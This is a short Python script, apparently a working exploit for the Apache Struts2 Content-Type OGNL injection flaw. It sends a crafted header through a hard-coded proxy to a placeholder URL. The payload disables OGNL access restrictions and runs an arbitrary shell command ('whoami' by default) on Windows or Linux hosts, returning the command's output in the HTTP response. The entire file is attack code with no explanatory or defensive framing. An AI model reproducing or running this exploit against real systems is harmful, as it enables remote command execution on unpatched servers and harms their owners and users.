import requests

session=requests.Session()

proxy = '112.85.170.203:9999'

#check_url = 'http://2019.ip138.com/ic.asp'

check_url = 'http://xxxx/'


#headers = {'user-agent':'Baidu Spider v1.0'}

proxy_dict = {
    "http": "http://" + proxy
    }



cmd = "whoami"

payloadPrefix="hah-multipart/form-data %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"

payloadSuffix="').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"


headers ={  "User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36",
                "Connection":"close",
                "Content-Type":str(payloadPrefix)+str(cmd)+str(payloadSuffix)
            }

req = session.post(check_url,headers=headers,proxies=proxy_dict)

print(req.text)
